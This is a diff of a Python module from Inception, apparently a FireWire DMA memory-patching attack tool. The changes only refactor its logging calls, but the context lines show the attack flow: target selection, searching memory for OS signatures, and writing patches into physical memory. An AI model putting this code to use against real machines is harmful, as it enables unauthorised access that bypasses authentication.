@@ -23,7 +23,7 @@ Created on Jun 23, 2011
 '''
 from inception.firewire import FireWire
 from inception.util import msg, MemoryFile, fail, bytelen, \
-    int2binhex, separator, bytes2hexstr
+    int2binhex, separator, bytes2hexstr, warn
 import inception.settings as settings
 import sys
 import time
@@ -36,7 +36,7 @@ def select_target(targets, selected=False):
     Provides easy selection of targets. Input is a list of targets (dicts)
     '''
     if len(targets) == 1:
-        msg('*', 'Only one target present, auto-selected')
+        msg('Only one target present, auto-selected')
         return targets[0]
     if not selected: selected = input('[!] Please select target (or enter \'q\' to quit): ')
     nof_targets = len(targets)
@@ -45,12 +45,12 @@ def select_target(targets, selected=False):
     except:
         if selected == 'q': sys.exit()
         else:
-            msg('!', 'Invalid selection, please try again. Type \'q\' to quit')
+            warn('Invalid selection, please try again. Type \'q\' to quit')
             return select_target(targets)
     if 0 < selected <= nof_targets:
         return targets[selected - 1]
     else:
-        msg('!', 'Please enter a selection between 1 and ' + str(nof_targets) + '. Type \'q\' to quit')
+        warn('Please enter a selection between 1 and ' + str(nof_targets) + '. Type \'q\' to quit')
         return select_target(targets)
     
 
@@ -58,7 +58,7 @@ def printdetails(target): # TODO: Fix this method
     '''
     Prints details about a target
     '''
-    msg('*', 'The target module contains the following signatures:')
+    msg('The target module contains the following signatures:')
     separator()
     print('\tVersions:\t' + ', '.join(target['versions']).rstrip(', '))
     print('\tArchitectures:\t' + ', '.join(target['architectures']).rstrip(', '))
@@ -89,10 +89,10 @@ def printdetails(target): # TODO: Fix this method
     
     
 def list_targets(targets, details=False):
-    msg('*', 'Available targets:')
+    msg('Available targets:')
     separator()
     for number, target in enumerate(targets, 1):
-                msg(number, target['OS'] + ': ' + target['name'])
+                msg(target['OS'] + ': ' + target['name'], sign = number)
                 if details:
                     printdetails(target)
     if not details: # Avoid duplicate separator
@@ -143,7 +143,7 @@ def patch(device, address, chunks):
             device.write(realaddress, patch)
             read = device.read(realaddress, len(patch))
             if settings.verbose:
-                msg('*', 'Data read back: ' + bytes2hexstr(read))
+                msg('Data read back: ' + bytes2hexstr(read))
             if  read != patch:
                 success = False
     return success
@@ -250,7 +250,7 @@ def attack(targets):
         start = time.time()
         device_index = fw.select_device()
         # Print selection
-        msg('*', 'Selected device: {0}'.format(fw.vendors[device_index]))
+        msg('Selected device: {0}'.format(fw.vendors[device_index]))
 
     # List targets
     list_targets(targets)
@@ -259,7 +259,7 @@ def attack(targets):
     target = select_target(targets)
     
     # Print selection. If verbose, print selection with signatures
-    msg('*', 'Selected target: ' + target['OS'] + ': ' + target['name'])
+    msg('Selected target: ' + target['OS'] + ': ' + target['name'])
     if settings.verbose:
         printdetails(target)
     
@@ -275,7 +275,7 @@ def attack(targets):
         memsize = settings.memsize
     
     # Perform parallel search for all signatures for each OS at the known offsets
-    msg('*', 'DMA shields should be down by now. Attacking...')
+    msg('DMA shields should be down by now. Attacking...')
     address, chunks = searchanddestroy(device, target, memsize)
     if not address:
         # TODO: Fall-back sequential search?
@@ -284,16 +284,16 @@ def attack(targets):
     # Signature found, let's patch
     mask = 0xfffff000 # Mask away the lower bits to find the page number
     page = int((address & mask) / settings.PAGESIZE)
-    msg('*', 'Signature found at {0:#x} (in page # {1})'.format(address, page))
+    msg('Signature found at {0:#x} (in page # {1})'.format(address, page))
     if not settings.dry_run:
         success = patch(device, address, chunks)
         if success:
-            msg('*', 'Write-back verified; patching successful')
+            msg('Write-back verified; patching successful')
             if settings.egg:
                 sound.play('data/inception.wav')
-            msg('*', 'BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
+            msg('BRRRRRRRAAAAAWWWWRWRRRMRMRMMRMRMMMMM!!!')
         else:
-            msg('!', 'Write-back could not be verified; patching *may* have been unsuccessful')
+            warn('Write-back could not be verified; patching *may* have been unsuccessful')
     
     #Clean up
     device.close()
